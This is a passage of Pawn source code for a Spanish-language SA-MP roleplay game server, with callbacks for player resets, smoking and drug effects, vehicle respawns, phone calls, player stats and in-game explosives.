	booleano[TextShow]{playerid} = false;
	booleano[ConEstado]{playerid} = false;
	booleano[CallGiveWeapon]{playerid} = false;
	booleano[_ComprandoCoche]{playerid} = false;
	booleano[_ComprandoDNI]{playerid} = false;
	booleano[_EstadoIphone]{playerid} = false;
	booleano[iConnect]{playerid} = false;
	booleano[PhoneOnline]{playerid} = false;
	booleano[HidePM]{playerid} = false;
	booleano[BigEar]{playerid} = false;
	booleano[gFam]{playerid} = false;
	booleano[gNews]{playerid} = false;
	booleano[gOoc]{playerid} = false;
	booleano[gIngreso]{playerid} = false;
	booleano[TalkingLive]{playerid} = false;
	booleano[Tazer]{playerid} = false;
	booleano[PlayerTazeado]{playerid} = false;
	booleano[PlayerCuffed]{playerid} = false;
	booleano[Ganzuas]{playerid} = false;
	booleano[NoFuel]{playerid} = false;
	booleano[AntiAbusos]{playerid} = false;
	booleano[AdminDuty]{playerid} = false;
	booleano[gMurio]{playerid} = false;
	booleano[NewUsed]{playerid} = false;
	booleano[Facturing]{playerid} = false;
	booleano[MsgL4L]{playerid} = false;
	booleano[Rescued]{playerid} = false;
	booleano[MensajeMuriendo]{playerid} = false;
	booleano[Regalo_Offer]{playerid} = false;
	booleano[FamiliaOficialOn]{playerid} = false;
	booleano[duda]{playerid} = false;
	booleano[ReduceTime]{playerid} = false;
	booleano[ComproCine]{playerid} = false;
	booleano[ComcRobooleto]{playerid} = false;
	booleano[PlayerSol]{playerid} = false;
	booleano[PlayerDuda]{playerid} = false;
	booleano[UsingRayBan]{playerid} = false;
	booleano[PickLock]{playerid} = false;
	booleano[PlayerNeedsHelp]{playerid} = false;
	booleano[DestruirTexto]{playerid} = false;
	booleano[Transplante]{playerid} = false;
	booleano[TienePeriodico]{playerid} = false;
	booleano[npcUse]{playerid} = false;
	
	memset(cuenta[playerid], 0, _:_@en@cuenta);
	cuenta[playerid][cVida] = 50.0;
	cuenta[playerid][cArmadura] = 0.0;
	
	for(new v=0; v<8;v++)
	{
		acciones[playerid][aAccTipo][v] = 0;
		acciones[playerid][aAccCantidad][v] = 0;
	}

	PaintPvcAsesinatos[playerid] = 0; 
	Bowling[playerid] = 0; 
	BowlingMoney[playerid] = 0; 
	cuenta[playerid][cCabeza] = 0; 
	EstadoON[playerid] = 0; 
	Advertencia_Debe[playerid] = 0; 
	Maskuse[playerid] = 0;
	
	quitarArmas(playerid);
	return 1;
}

CallBack::darArmadura(playerid, Float:armour)
{
	cuenta[playerid][cArmadura] = armour;
	SetPlayerArmour(playerid, armour);
	return 1;
}

CallBack::FinishHablar(playerid)
{
  ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
}
CallBack::SmokingCigarette(playerid)
{
	if(IsPlayerConnected(playerid)){
	    if(IsSmoking[playerid] > 0)
		{
			new Float:PlayerHealth, string[128];
 			GetPlayerHealth(playerid, PlayerHealth);
  			switch(IsSmoking[playerid])
   			{
    			case 1:
     			{
					format(string, sizeof(string), "* %s acaba su cigarro y tira lo al suelo.", PlayerName(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					if( PlayerHealth < 100) SetHP(playerid, PlayerHealth+5);
					cuenta[playerid][pCancer] += 2;
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
					ClearAnimations(playerid);
  				}
	    		case 20:
		    	{
   					format(string, sizeof(string), "* %s hace circulos con el humo del cigarro.", PlayerName(playerid));
 	  				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					if( PlayerHealth < 100) SetHP(playerid, PlayerHealth+5);
					cuenta[playerid][pCancer] += 2;
  				}
		    	case 40:
		    	{
  					format(string, sizeof(string), "* %s se fuma su cigarro al suave.", PlayerName(playerid));
  					ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					if( PlayerHealth < 100) SetHP(playerid, PlayerHealth+5);
					cuenta[playerid][pCancer] += 2;
  				}
	    	}
			IsSmoking[playerid] -= 1;
		}
		else
		{
	    	KillTimer(SmokeTimer[playerid]);
		}
	}
	return 1;
}
CallBack::SendJobMessage(job, color, string[])
{
	for(new i=0, _max=GetMaxPlayers();i<_max;i++)
	{
	    if(IsPlayerConnected(i))
	    {
 			if(cuenta[i][cTrabajo] == job)
   			{
   			    Mensaje(i, color, string);
			}
		}
	}
}

CallBack::RevisarCoches()
{
	new Float:vcoche;
	new motor, luces, alarma, puertas, capo, baul, objetivo;
	for(new c=0;c<sizeof(autos);c++)
	{
		for(new j=0, _max=GetMaxPlayers();j<_max;j++)
		{
			if(IsPlayerInAnyVehicle(j) && GetPlayerVehicleID(j) == c)
			{
				GetVehicleHealth(c, vcoche);
				if(vcoche <= 250)
				{
					GetVehicleParamsEx(c, motor, luces, alarma, puertas, capo, baul, objetivo);
					SetVehicleHealth(c, 300);
					SetVehicleParamsEx(c, 0, 0, alarma, puertas, capo, baul, objetivo);
					GameTextForPlayer(j, "~w~Motor ~r~danado", 4000, 5);
					Mensaje(j, COLOR_AMARILLO, "» {FFFFFF}El motor se ha dañado llama a un mecanico /servicios.");
				}
			}
		}
	}
	return 1;
}
CallBack::splits(const strsrc[], strdest[][], delimiter)
{
	new i, li;
	new aNum;
	new len;
	while(i <= strlen(strsrc)){
		if(strsrc[i]==delimiter || i==strlen(strsrc)){
			len = strmid(strdest[aNum], strsrc, li, i, 128);
			strdest[aNum][len] = 0;
			li = i+1;
			aNum++;
		}
		i++;
	}
	return 1;
}
CallBack::DisableVehicleAlarm(vehicleid)
{
    new engine, lights, alarm, doors, bonnet, boot, objective;
    GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
    SetVehicleParamsEx(vehicleid, engine, lights, false, doors, bonnet, boot, objective);
}
CallBack::spawnAutos()
{
	for(new c=1; c<MAX_VEHICLES; c++)
	{
		if(EsComprable(c))
		{
		    SetVehicleToRespawn(c); 
		    vehiculoEncendido[c] = false;
		    ChangeVehicleColor(c, autos[c][cColorOne], autos[c][cColorTwo]);
		    Gas[c] = 1000;
			maletero[c][mbloqueo] = false;
		}
		else
		{
		    SetVehicleToRespawn(c);
		    vehiculoEncendido[c] = false;
		    Gas[c] = 1000;
			maletero[c][mbloqueo] = false;
		}
	}
	MensajeGlobal(COLOR_VERDE, "Respawn general terminado.");
	return 1;
}
CallBack::spawnAuto(vehicle)
{
	if(EsComprable(vehicle))
	{
		SetVehicleToRespawn(vehicle); 
		vehiculoEncendido[vehicle] = false;
		ChangeVehicleColor(vehicle, autos[vehicle][cColorOne], autos[vehicle][cColorTwo]);
		Gas[vehicle] = 1000;
		maletero[vehicle][mbloqueo] = false;
	}
	else
	{
		SetVehicleToRespawn(vehicle);
		vehiculoEncendido[vehicle] = false;
		Gas[vehicle] = 1000;
		maletero[vehicle][mbloqueo] = false;
	}
	return 1;
}
CallBack::StopCall(playerid)
{
    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
    SetTimerEx("RemoveHand", 1800, false, "i", playerid);
    new caller = Mobile[playerid];
    if(IsPlayerConnected(caller))
	{
		if(caller != INVALID_PLAYER_ID)
		{
			if(caller != 255)
			{
				if(caller < 255)
				{
					Mensaje(caller, COLOR_GRIS2, "Llamada finalizada.");
					Mensaje(playerid, COLOR_GRIS2, "Llamada finalizada.");
					CellTime[caller] = 0;
					CellTime[playerid] = 0;
					Mobile[caller] = 255;
				}
				Mobile[playerid] = 255;
				CellTime[playerid] = 0;
				Speaker[playerid] = 0;
			}
		}
	}
	Mobile[playerid] = 255;
}
CallBack::RemoveHand(playerid)
{
    RemovePlayerAttachedObject(playerid, 0);
    Att_Obj_Slot_0[playerid] = "Vacío";
}
CallBack::UntazePlayer(playerid)
{
	new string[128];
	ClearAnimations(playerid);
	TogglePlayerControllable(playerid, 1);
	format(string, sizeof(string), "* Recuperado de la descarga (%s)", PlayerName(playerid));
	ProxDetector(30.0, playerid, string, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF);
	booleano[PlayerTazeado]{playerid} = false;
	return 1;
}
CallBack::IntentarTimer(playerid)
{
	Intentar[playerid] = 0;
}
CallBack::Detective_FindPerson(playerid)
{
	if(IsPlayerConnected(playerid)){
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(WhoFind[playerid], X, Y, Z);
		SetPlayerCheckpoint(playerid, X, Y, Z, 6);
		Mensaje(playerid, TEAM_RADIO_COLOR, "** Información: se estableció el destino de búsqueda en su radar");
		WhoFind[playerid] = 0;
	}
	return 1;
}

CallBack::Detective_FindCar(playerid)
{
	if(IsPlayerConnected(playerid)){
	    new Float:X, Float:Y, Float:Z;
		GetVehiclePos(WhoFind[playerid], X, Y, Z);
		SetPlayerCheckpoint(playerid, X, Y, Z, 10);
		Mensaje(playerid, TEAM_RADIO_COLOR, "** Información: se estableció el destino de búsqueda en su radar");
		WhoFind[playerid] = 0;
 	}
	return 1;
}
CallBack::BackupClear(playerid, timer)
{
	if(IsPlayerConnected(playerid))
	{
		if(booleano[jObjetivo]{playerid})
		{
			if(timer != 0) Mensaje(playerid, COLOR_AZUL, "Tu pedido de refuerzos ha sido cancelado automáticamente.");
			else Mensaje(playerid, COLOR_AZUL, "Tu pedido fue cancelado.");
			booleano[jObjetivo]{playerid} = false;
		}
	}
    return 1;
}
CallBack::SetHP(playerid, Float:hp)
{
    cuenta[playerid][cVida] = hp;
    SetPlayerHealth(playerid, hp);
    return 1;
}
CallBack::GiveHP(playerid, Float:hp)
{
	if(hp >= 100)
	{
		cuenta[playerid][cVida] = 100;
		SetPlayerHealth(playerid, cuenta[playerid][cVida]);
	}
	else
	{
		cuenta[playerid][cVida] = hp;
		SetPlayerHealth(playerid, cuenta[playerid][cVida]);
	}
    return 1;
}
 
CallBack::FBIGATEC1(){
	  MoveDynamicObject(fbig1, 200.02711487, 160.48478699, 1002.02343750, 3.0, -1000.0, -1000.0, -1000.0);
      return 1;
}

CallBack::FBIGATEC2(){
	  MoveDynamicObject(fbig2, 200.15646362, 185.94311523, 1002.03552246, 3.0, -1000.0, -1000.0, -1000.0);
      return 1;
}

CallBack::TumbarPuerta(playerid, Float:x, Float:y, Float:z)
{
    CreateExplosion(x, y, z, 3, 5);
	casa[HouseExplo[playerid]][hLock] = 0;
	ProxDetector(25.0, playerid, "El C4 ha sido detonado con exito, ya pueden entrar!", COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
	HouseExplo[playerid] = 9999;
	return 1;
}

CallBack::MissileLaunchEx(Float:x, Float:y, Float:z, Float:radius, type)
{
    CreateExplosion(x, y, z, type, radius);
    Misile_Launcher --;
    new string[100];
    format(string, sizeof(string), "** Lanzamiento detonado en %0.2f - %0.2f - %0.2f, radio %d.", x, y, z, radius);
    SendRadioMessage(3, TEAM_RADIO_COLOR, string);
    return 1;
}

CallBack::MissileLaunch(vehicleid)
{
	new Float:x, Float:y, Float:z;
	GetVehiclePos(vehicleid, x, y, z);
    CreateExplosion(x, y, z, 2, 10.0);  CreateExplosion(x, y, z, 2, 10.0);  CreateExplosion(x, y, z, 2, 10.0);
    Misile_Launcher --;
    new string[68];
    format(string, sizeof(string), "** Lanzamiento detonado en el objetivo, vehículo %d.", vehicleid);
    SendRadioMessage(3, TEAM_RADIO_COLOR, string);
    return 1;
}

CallBack::OtherTimer()
{
	new string[100];
    for(new i=0, t=GetMaxPlayers();i<t;i++)
	{ 
	    if(IsPlayerConnected(i))
	    {
	        new vehicle = GetPlayerVehicleID(i);
			if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
			{
			    if(Gas[vehicle] < 100)
				{
					PlayerPlaySound(i, 1085, 0.0, 0.0, 0.0);
				}
			}
			if(Tied[i] > 0)
			{
			    TogglePlayerControllable(i, 0);
			}
			if(CellTime[i] > 0)
			{
				if(CellTime[i] == cchargetime)
				{
					CellTime[i] = 1;
				}
				if(Mobile[i] != 255 && Mobile[Mobile[i]] == i)
				{
					if(CallCost[i] >= cuenta[i][cSaldo])
					{ 
						StopCall(i); 
						Mensaje(i, COLOR_BLANCO, "{018CFE}MOVISTAR: {FFFFFF}Se te acabó el saldo, debes realizar una recarga.");
					}
					else 
					{ 
						CallCost[i] = CallCost[i]+1; 
					}
				}
				CellTime[i] = CellTime[i] +1;
				if(Mobile[i] != 255 && Mobile[Mobile[i]] == 255 && CellTime[i] == 5)
				{
				    if(IsPlayerConnected(Mobile[i]))
				    {
						format(string, sizeof(string), "* El teléfono de %s suena", PlayerName(Mobile[i]));
						ProxDetector(30.0, Mobile[i], string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
				}
			}
			if(CellTime[i] == 0 && CallCost[i] > 0)
			{
				format(string, sizeof(string), "~w~La llamada te costo~n~~r~$%d", CallCost[i]/10);
				GameTextForPlayer(i, string, 5000, 1);
				cuenta[i][cSaldo] -= CallCost[i];
				CallCost[i] = 0;
			}
			if(!EsBicicleta(vehicle))
			{
				if(IsPlayerInAnyVehicle(i) && vehiculoEncendido[vehicle] && Gas[vehicle] < 10)
				{
					new engine, lights, alarm, doors, bonnet, boot, objective;
					GetVehicleParamsEx(vehicle, engine, lights, alarm, doors, bonnet, boot, objective);
					SetVehicleParamsEx(vehicle, 0, lights, alarm, doors, bonnet, boot, objective);
					vehiculoEncendido[vehicle] = false;
					GameTextForPlayer(i, "~w~vehiculo sin~n~~r~gasolina", 1500, 1);
				}
			}
		}
	}
	for(new h=1; h<VEHICULOS_COMPRABLES; h++)
	{
		if(!EsBicicleta(h))
		{
			if(!autos[h][cBattery])
			{
				new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(h, engine, lights, alarm, doors, bonnet, boot, objective);
				SetVehicleParamsEx(h, 0, lights, alarm, doors, bonnet, boot, objective);
				vehiculoEncendido[h] = false;
				return 1;
			}
		}
	}
	return 1;
}

CallBack::MostrarVehiculo(vehicleid)
{
    SetVehiclePosEx(vehicleid, autos[vehicleid][cLocationx], autos[vehicleid][cLocationy], autos[vehicleid][cLocationz]); 
	SetVehicleParamsEx(vehicleid , vehiculoEncendido[vehicleid], 0, 0, autos[vehicleid][cLock], 0, 0, 0);
	SetVehicleHealth(vehicleid, 250.0);
	SetVehicleVirtualWorld(vehicleid, 0);
}

//Texto Informacion
CallBack::TextoInformatico(time, playerid, tutorial[]){
	PlayerTextDrawSetString(playerid, InfoText[playerid][12], tutorial);
	PlayerTextDrawShow(playerid, InfoText[playerid][12]);
	if(!booleano[DestruirTexto]{playerid}){
		booleano[DestruirTexto]{playerid} = true;
		SetTimerEx("DestruirInformacion", time * 1000, false, "d", playerid);
	}
	return 1;
}
//Texto Informacion Destruccion
CallBack::DestruirInformacion(playerid){
	booleano[DestruirTexto]{playerid} = false;
	PlayerTextDrawHide(playerid, InfoText[playerid][12]); 
	return 1;
}

CallBack::ShowStats(playerid, targetid)
{
    if(IsPlayerConnected(playerid) && IsPlayerConnected(targetid))
	{		
	
		new cash =  obtenerDinero(targetid);
		new account = cuenta[targetid][cDineroBanco];
		new carkey = cuenta[targetid][cCoche];
		new carkey2 = cuenta[targetid][cCoche2];
		new CarPremium = cuenta[targetid][cCoche3];
		new CarPremium2 = cuenta[targetid][cCoche4];
		new nxtlevel = cuenta[targetid][cNivel]+1;
		new expamount = nxtlevel*levelexp;
		new jails = cuenta[targetid][cInv1][1];
		new string[126];
		
		//ZZCASH
		switch(cuenta[targetid][cDonador])
		{
			case 1: format(string, sizeof(string), "Premium Silver");
			case 2: format(string, sizeof(string), "Premium Gold");
			case 3: format(string, sizeof(string), "Premium Titanium");
			case 4: format(string, sizeof(string), "Premium ZZ Fans");
		}
		
		ClearChatbox(playerid, 21);
		new iString[500];
		format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}Tu Cuenta: {E4A54D}%s", PlayerName(targetid));
		Mensaje(playerid, -1, iString);
		format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}Edad [%d] Nivel [%d] Sexo [%s] Capital [%d$] Banco [%d$] Teléfono [%d] Tarjeta [%d]", cuenta[targetid][cEdad], cuenta[targetid][cNivel], PlayerStatInfo[targetid][0], cash, account, cuenta[targetid][cTelefono], cuenta[targetid][cTarjeta]);
		Mensaje(playerid, -1, iString);
		format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}Proximo Nivel: %d (%d/%d) Facción [%s] Rango [%s] Trabajo [%s]", nxtlevel, cuenta[targetid][cExperiencia], expamount, PlayerStatInfo[targetid][3], PlayerStatInfo[targetid][4], trabajos[cuenta[targetid][cTrabajo]][trabNombre]);
		Mensaje(playerid, -1, iString);
	    format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}Horas Jugadas [%d] Nivel de Busqueda [%d] Cheques [%d$]", cuenta[targetid][cHorasJugadas], cuenta[targetid][cBusqueda], cuenta[targetid][cCheques]);
		Mensaje(playerid, -1, iString);
	    format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}Coche Renta [%d] Casa Renta [%d] ZZcash: {E4A54D}%d", HireKey[targetid], cuenta[targetid][cRentado], cuenta[targetid][cZonaZeroCash]);
		Mensaje(playerid, -1, iString);
	    format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}Puntos de Rol [%d] Advertencias del Rol [%d/3] Advertencias Admin [%d/3] Veces Jails [%d/7] Monedas [%d]", cuenta[targetid][cPuntosRol], cuenta[targetid][cADVRol], cuenta[targetid][cAdvertencias], jails, cuenta[targetid][cMonedas]);
		Mensaje(playerid, -1, iString);
	    format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}Tiempo Jugado: %d hora(s) con %d minuto(s)", cuenta[targetid][cHoras], cuenta[targetid][cMinutos]);
		Mensaje(playerid, -1, iString);
		
		if(cuenta[targetid][cDonador])
		{
			format(iString, sizeof(iString), "{E4A54D}» {E4A54D}Premium{FFFFFF} [%s] {E4A54D}Tiempo:{FFFFFF} %s", string, generarTiempo(cuenta[targetid][cDonar][0] - gettime()));
			Mensaje(playerid, -1, iString);
		}
		if(cuenta[targetid][cCoche])
		{
		    format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}1er Vehículo: %s  Valor: %d$  Colores:%d/%d  Seguro:%d Llave: %d Impuesto: {AA3333}%s", autos[carkey][cName], autos[carkey][cValue], autos[carkey][cColorOne], autos[carkey][cColorTwo], autos[carkey][cLock], carkey, ObtenerTiempoRestante(autos[carkey][cVehTime]));
			Mensaje(playerid, -1, iString);
		}
		if(cuenta[targetid][cCoche2])
		{
			format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}2do Vehículo: %s  Valor: %d$  Colores:%d/%d  Seguro:%d Llave: %d Impuesto: {AA3333}%s", autos[carkey2][cName], autos[carkey2][cValue], autos[carkey2][cColorOne], autos[carkey2][cColorTwo], autos[carkey2][cLock], carkey2, ObtenerTiempoRestante(autos[carkey2][cVehTime]));
 			Mensaje(playerid, -1, iString);
		}
		if(cuenta[targetid][cCoche3])
		{
			format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}1er Vehículo VIP: %s  Valor: %d$  Colores:%d/%d  Seguro:%d  Llave: %d Impuesto: {AA3333}%s", autos[CarPremium][cName], autos[CarPremium][cValue], autos[CarPremium][cColorOne], autos[CarPremium][cColorTwo], autos[CarPremium][cLock], CarPremium, ObtenerTiempoRestante(autos[CarPremium][cVehTime]));
			Mensaje(playerid, -1, iString);
        }
   		if(cuenta[targetid][cCoche4])
		{
			format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}2do Vehículo VIP: %s  Valor: %d$  Colores:%d/%d  :%d  Llave: %d Impuesto: {AA3333}%s", autos[CarPremium2][cName], autos[CarPremium2][cValue], autos[CarPremium2][cColorOne], autos[CarPremium2][cColorTwo], autos[CarPremium2][cLock], CarPremium2, ObtenerTiempoRestante(autos[CarPremium2][cVehTime]));
			Mensaje(playerid, -1, iString);
		}
   		if(cuenta[targetid][cNegocio] != 9999)
		{
			new bizz = cuenta[targetid][cNegocio];
			format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}1er Negocio: %s Valor: %d$ Ganancias: %d$ Llave: %d Impuesto: {AA3333}%s", negocio[bizz][bName], negocio[bizz][bBuyPrice], negocio[bizz][bTill], bizz, ObtenerTiempoRestante(negocio[bizz][bTime]));
			Mensaje(playerid, -1, iString);
		}   		
		if(cuenta[targetid][cNegocio2] != 9999)
		{
			new bizz = cuenta[targetid][cNegocio2];
			format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}2do Negocio VIP: %s Valor: %d$ Ganancias: %d$ Llave: %d Impuesto: {AA3333}%s", negocio[bizz][bName], negocio[bizz][bBuyPrice], negocio[bizz][bTill], bizz, ObtenerTiempoRestante(negocio[bizz][bTime]));
			Mensaje(playerid, -1, iString);
		}
   		if(cuenta[targetid][cCasa] != 9999)
		{
			new houseid = cuenta[targetid][cCasa];
			format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}1er Casa: %s Valor: %d$ Llave: %d Impuesto: {AA3333}%s", casa[houseid][hNombre], casa[houseid][hValue], houseid, ObtenerTiempoRestante(casa[houseid][hTime]));
			Mensaje(playerid, -1, iString);
		}
   		if(cuenta[targetid][cCasa2] != 9999)
		{
			new houseid = cuenta[targetid][cCasa2];
			format(iString, sizeof(iString), "{E4A54D}» {FFFFFF}2do Casa VIP: %s Valor: %d$ Llave: %d Impuesto: {AA3333}%s", casa[houseid][hNombre], casa[houseid][hValue], houseid, ObtenerTiempoRestante(casa[houseid][hTime]));
			Mensaje(playerid, -1, iString);
		}
   		if(cuenta[targetid][cPackID] == 1)
		{
			format(iString, sizeof(iString), "{E9BC0A}»{FFFFFF} Paquete: Gold - Tiempo: %s", ObtenerTiempoRestante(cuenta[targetid][cPack]));
			Mensaje(playerid, -1, iString);
   		}else if(cuenta[targetid][cPackID] == 2){
			format(iString, sizeof(iString), "{E9BC0A}»{FFFFFF} Paquete: Premium - Tiempo: %s", ObtenerTiempoRestante(cuenta[targetid][cPack]));
			Mensaje(playerid, -1, iString);
		}
  		if(cuenta[targetid][cPuntosRol] == 0)
		{
			format(iString, sizeof(iString), "{E4A54D}»{FFFFFF} Rango de Rol: {E4A54D}No tienes ningun Punto de Rol");
			Mensaje(playerid, COLOR_BLANCO, iString);
		}
		if(cuenta[targetid][cPuntosRol] >= 1 && cuenta[targetid][cPuntosRol] <= 2)
		{
			format(iString, sizeof(iString), "{E4A54D}»{FFFFFF} Rango de Rol: {E4A54D}Roler Novato");
			Mensaje(playerid, COLOR_BLANCO, iString);
		}
		if(cuenta[targetid][cPuntosRol] >= 3 && cuenta[targetid][cPuntosRol] <= 5)
		{
			format(iString, sizeof(iString), "{E4A54D}»{FFFFFF} Rango de Rol: {E4A54D}Roler Intermedio");
			Mensaje(playerid, COLOR_BLANCO, iString);
		}
		if(cuenta[targetid][cPuntosRol] >= 6 && cuenta[targetid][cPuntosRol] <= 9)
		{
			format(iString, sizeof(iString), "{E4A54D}»{FFFFFF} Rango de Rol: {E4A54D}Roler Experto");
			Mensaje(playerid, COLOR_BLANCO, iString);
		}
  		if(cuenta[targetid][cPuntosRol] == 10)
		{
			format(iString, sizeof(iString), "{E4A54D}»{FFFFFF} Rango de Rol: {E4A54D}Roler Profesional");
			Mensaje(playerid, COLOR_BLANCO, iString);
		}
	}
	return 1;
}
CallBack::Ectasy(i)
{
    new Float:cx, Float:cy, Float:cz, string[128];	GetPlayerPos(i, cx, cy, cz);
	if(UsingEctasy[i] > 0)
	{
        UsingEctasy[i] -= 1;
 		switch(UsingEctasy[i])
   		{
     		case 285: { format(string, sizeof(string), "%s dice: Vivo en un lugar paralelo a la realidad.", PlayerName(i));  Mensaje(i, COLOR_FADE, string); GetPlayerPos(i, InceptionPos[i][0], InceptionPos[i][1], InceptionPos[i][2]); }
			case 280: { format(string, sizeof(string), "Voz desconocida dice: ¿ Cuánto tiempo %s, verdad ?", PlayerName(i));  Mensaje(i, COLOR_FADE, string); }
			case 275: { Mensaje(i, COLOR_FADE, "Voz desconocida dice: ¿ No me recuerdas, soy yo ... ?"); }
			case 270: { Mensaje(i, COLOR_FADE, "Voz desconocida dice: ¿ No me respondes ... que mal educado ... ?"); }
			case 260: { Mensaje(i, COLOR_FADE, "Voz desconocida dice: Veo, que ... has crecido ..."); }
			case 250: { Mensaje(i, COLOR_FADE, "Voz desconocida dice: Has aceptado pactar, conmigo. Verdad?"); }
			case 240: { Mensaje(i, COLOR_FADE, "Voz desconocida dice: Estás en lo cierto pero ... pactar conmigo tiene sus inconvenientes"); }
			case 230: { Mensaje(i, COLOR_FADE, "Voz desconocida dice: Pero ... veo que tu los has aceptado."); }
			case 220: { Mensaje(i, COLOR_FADE, "Voz desconocida dice: ¿ No te gusta tu realidad, verdad ?"); }
			case 210: { Mensaje(i, COLOR_FADE, "Voz desconocida dice: Yo te ofrezco una, pero producto de tu imaginación."); }
			case 200: { Mensaje(i, COLOR_FADE, "Voz desconocida dice: ¿ Aceptas ?"); }
			case 195: { SetPlayerWeather(i, 250); }
			case 190: { Mensaje(i, COLOR_FADE, "Voz desconocida dice: Es normal tu miedo... lo tomaré como un Sí!"); }
			case 180: { Mensaje(i, COLOR_FADE, "Voz desconocida dice: Muahahaha! Intenta salir del laberinto de tu subconciente amigo."); }
			case 170: { Mensaje(i, COLOR_FADE, "Voz suave dice: No! No camines! No intentes salir de aquí! No podrás!"); }
			case 160: { Mensaje(i, COLOR_FADE, "Voz suave dice: Solo puedes salir si consigues devolverme a la vida!"); }
			case 150: { Mensaje(i, COLOR_FADE, "Voz suave dice: Para eso, necesitas mi alma! Encuentrala, porfavor!"); }
			case 140: { Mensaje(i, COLOR_FADE, "Voz suave dice: Guíate por tu intuición, piensa en lo real!"); }
			case 130: { Mensaje(i, COLOR_FADE, "Voz desconocida dice: Hahahahaaha! Nunca saldrás de aqui!"); }
			case 125: { SetPlayerWeather(i, 19); }
			case 110: { SetPlayerPos(i, cx+100, cy+50, cz+3); Mensaje(i, COLOR_FADE, "Voz desconocida dice: Hahahahaaha!");}
			case 108: { SetPlayerPos(i, cx+100, cy+50, cz+3); Mensaje(i, COLOR_FADE, "Voz desconocida dice: Hahahahaaha!");}
			case 106: { SetPlayerPos(i, cx+100, cy+50, cz+3); Mensaje(i, COLOR_FADE, "Voz desconocida dice: Muahahahaahahahaaha!");}
			case 104: { SetPlayerPos(i, cx+100, cy+50, cz+3); Mensaje(i, COLOR_FADE, "Voz desconocida dice: Hahahahaaha!");}
			case 102: { SetPlayerPos(i, cx+100, cy+50, cz+3); Mensaje(i, COLOR_FADE, "Voz desconocida dice: Atrapado en tu realidad ficticia!");}
			case 100: { SetPlayerPos(i, cx+100, cy+50, cz+3); Mensaje(i, COLOR_FADE, "Voz desconocida dice: Moriraas!");}
			case 96: { SetPlayerPos(i, cx+100, cy+50, cz+3); }
			case 95: { SetPlayerPos(i, cx+100, cy+50, cz+3); Mensaje(i, COLOR_FADE, "Voz desconocida dice: Hhaahhahaa!"); SetPlayerPos(i, cx+100, cy+50, cz+3);}
			case 94: { SetPlayerPos(i, cx+100, cy+50, cz+3); Mensaje(i, COLOR_FADE, "Voz desconocida dice: Hasta nunca ... !"); SetPlayerPos(i, cx+100, cy+50, cz+3);}
			case 93: { SetPlayerWeather(i, 2009); SetPlayerPos(i, cx+100, cy+50, cz+3); }
			case 92: { SetPlayerPos(i, cx+100, cy+50, cz+3); }
			case 60: { format(string, sizeof(string), "%s dice: He de volver a la realidad, ahora!", PlayerName(i));  Mensaje(i, COLOR_FADE, string); }
			case 10: { format(string, sizeof(string), "%s dice: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaahhhhh!", PlayerName(i));  Mensaje(i, COLOR_FADE, string); }
			case 9: { SetPlayerWeather(i, 150); }
		}
	}
	if(UsingEctasy[i] == 0 && EctasyEffect[i] == 1 && UsingDrugs[i] == 1)
	{
	    KillTimer(DrugTimer[i]);
		GameTextForPlayer(i, "~w~Efecto ~y~extasis ~n~~w~pasado", 5000, 1);
  		UsingDrugs[i] = 0;
		SetPlayerWeather(i, DefaultWeather);
		UsingEctasy[i] = 0;
  		EctasyEffect[i] = 0;
    	SetPlayerPos(i, InceptionPos[i][0], InceptionPos[i][1], InceptionPos[i][2]);
	    SetPlayerVirtualWorld(i, 0);
	}
	return 1;
}

CallBack::SpeedEffectEnd(playerid){
    SetPlayerStats(playerid);
	GameTextForPlayer(playerid, "~w~Efecto ~p~speed ~n~~w~pasado", 5000, 1);
    UsingDrugs[playerid] = 0;
    KillTimer(DrugTimer[playerid]);
    return 1;
}

CallBack::GetClosestPlayer(p1){
	new x, Float:dis, Float:dis2, player;
	player = -1;
	dis = 99999.99;
	for (x=0;x<MAX_PLAYERS;x++)
	{
		if(IsPlayerConnected(x))
		{
			if(x != p1)
			{
				dis2 = GetDistanceBetweenPlayers(x, p1);
				if(dis2 < dis && dis2 != -1.00)
				{
					dis = dis2;
					player = x;
				}
			}
		}
	}
	return player;
}
CallBack::BroadCast(color, const string[]){
	MensajeGlobal(color, string);
	return 1;
}
CallBack::FixHour(hour)
{
	if (hour < 0)
	{
		hour = hour+24;
	}
	else if (hour > 23)
	{
		hour = hour-24;
	}
	shifthour = hour;
	return 1;
}
CallBack::ComproVehiculo(jugador, modelo, valor, stockact, stockmax)
{
	new carid = ObtenerVehicle();
	if(cuenta[jugador][cNivel] < 2)return Mensaje(jugador, COLOR_ROJO, "Debes ser como mínimo nivel 2");
